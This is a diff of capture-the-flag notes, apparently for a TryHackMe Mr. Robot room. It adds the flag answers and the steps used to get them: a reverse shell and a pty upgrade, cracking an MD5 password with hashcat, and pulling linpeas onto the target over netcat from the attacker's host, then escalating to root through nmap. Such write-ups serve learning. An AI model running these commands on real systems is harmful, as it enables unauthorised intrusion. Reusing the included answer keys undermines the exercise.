@@ -1,4 +1,4 @@
-export IP=10.10.142.2
+export IP=10.10.60.133
 
 
 ==================================================
@@ -18,11 +18,20 @@ export IP=10.10.142.2
 
 2) What is key 2?
 
-	Answer: ``
+	Answer: `822c73956184f694993bede3eb39f959`
+	Notes: 
+		- While reverse shelled in the system as daemon, I ran the command, `python -c 'import pty; pty.spawn("/bin/bash")'` to spawn a bash shell, which would allow me to run the `su` command and log in as the user robot.
+		- Ran command: `su -l robot` + cracked password from before, `abcdefghijklmnopqrstuvwxyz`
+		- Gained access to robot user and was able to read the second flag.
 
 3) What is key 3?
 
-	Answer: ``
+	Answer: `04787ddef27c3dee1ee161b21670b4e4`
+	Notes:
+		- Found an nmap vulnerability after scanning through the linpeas.sh output.
+		- Search GTFOBins for nmap exploit and found this: https://gtfobins.github.io/gtfobins/nmap/
+		- Used Shell > option b to gain access to root
+		- Found the last flag at /root/key-3-of-3.txt
 
 
 ==================================================
@@ -98,3 +107,16 @@ Notes:
 		- Open a netcat connection on my local machine: `nc -lvpn 9999`
 		- Then go to: http://$IP/wp-content/themes/twentyfifteen/404.php
 		- And VOILA! You have yourself a reverse shell.
+
+	- Found a password.raw-md5 file at /home/robot/password.raw-md5
+		- Copied it to my local machine and am going to run hashcat on it.
+		- `hashcat -a 0 -m 0 -o cracked-password.raw-m5 c3fcd3d76192e4007dfb496cca67e13b /usr/share/wordlists/rockyou.txt`
+		- Cracked password: abcdefghijklmnopqrstuvwxyz
+		- `robot:abcdefghijklmnopqrstuvwxyz`
+
+	- Used Netcat to move my /root/dev/linpeas.sh file over to the machine.
+		- On my machine, I ran: `nc -q 0 -lvnp 1234 < linpeas.sh`
+		- On the THM box, I ran: `nc <MY IP> 1234 > linpeas.sh`
+		- Once downloaded, I changed the mode to executable: `chmod +x linpeas.sh`
+		- Ran linpeas and found nmap vulnerability.
+		- Side note: when I tried running linpeas.sh the first time, apparently is was already open somewhere else so I had to find the PID using this command, `fuser linpeas.sh`, then ran `kill <PID>` to stop it.
